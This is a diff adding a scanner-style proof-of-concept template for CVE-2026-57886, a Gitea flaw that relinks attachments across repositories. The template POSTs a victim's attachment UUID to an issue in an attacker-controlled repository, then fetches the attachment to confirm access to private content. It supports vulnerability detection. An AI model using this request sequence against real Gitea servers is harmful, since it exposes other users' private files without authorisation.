@@ -1,0 +1,45 @@
+[info]
+author = "AVE"
+description = "检测 Gitea 跨仓库附件重链接漏洞：通过向攻击者可控仓库的议题编辑接口提交受害者附件 UUID，验证能否越权访问私有附件内容"
+id = "POC-AVE-2026-0649"
+name = "CVE-2026-57886 PoC"
+severity = "medium"
+tags = ["cve-2026-57886"]
+vuln_id = [
+    "CVE-2026-57886",
+    "AVE-2026-0649",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/{{attacker_owner}}/{{attacker_repo}}/issues/{{issue_id}}"
+protocol = "http"
+
+[poc.requests.body]
+content = "files[]={{victim_uuid}}&_csrf={{csrf_token}}"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+Cookie = "{{cookie}}"
+
+[[poc.requests.matchers]]
+expect = true
+status = [302]
+type = "status"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/attachments/{{victim_uuid}}"
+protocol = "http"
+
+[poc.requests.headers]
+Cookie = "{{cookie}}"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
